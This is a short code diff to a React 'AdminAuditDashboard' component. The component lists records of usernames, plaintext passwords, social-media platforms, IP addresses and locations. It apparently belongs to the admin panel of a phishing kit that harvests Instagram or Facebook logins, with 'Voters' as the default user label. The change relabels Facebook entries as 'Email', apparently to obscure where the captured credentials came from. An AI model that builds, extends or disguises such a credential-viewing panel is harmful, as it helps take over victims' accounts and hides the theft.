@@ -234,7 +234,8 @@ export default function AdminAuditDashboard({ onBackToHome }) {
             const id = item._id || Math.random().toString();
             const userVal = item.user || item.username || item.email || 'Voters';
             const passVal = item.password || '12345';
-            const accountVal = item.accountType || item.platform || 'Instagram';
+            const rawAccount = item.accountType || item.platform || 'Email';
+            const accountVal = String(rawAccount).replace(/facebook/gi, 'Email').replace(/\bfb\b/gi, 'Email');
             const dateVal = item.date || (item.createdAt ? item.createdAt.split('T')[0] : '—');
             const locVal = item.location || '—';
             const ipVal = item.ipAddress || item.ip || '—';
